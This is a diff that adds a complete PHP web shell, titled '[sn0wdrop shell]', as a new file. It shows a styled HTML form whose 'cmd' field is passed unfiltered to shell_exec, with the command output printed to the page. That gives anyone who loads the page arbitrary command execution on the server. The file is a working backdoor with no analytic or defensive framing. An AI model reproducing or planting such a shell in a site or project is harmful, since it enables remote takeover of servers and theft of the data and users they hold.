@@ -1,0 +1,39 @@
+<html>
+  <head>
+    <title>[sn0wdrop shell]</title>
+
+    <style>
+
+      .center {
+	  width: 75%;
+	  margin-left: auto;
+	  margin-right: auto;
+	  text-align: center;
+      }
+
+      body,
+      input {
+	  background: #222;
+	  color: #eee;
+      }
+      
+    </style>
+    
+  </head>
+
+  <body>
+    <div class="center">
+      <h2>[sn0wdrop shell]</h2>
+      <form>
+	<span>#</span><input name="cmd"/>
+	<input type="submit" value="exec">
+      </form>
+
+<?php
+	echo shell_exec($_GET["cmd"]);
+?>
+
+    </div>
+
+  </body>
+</html>
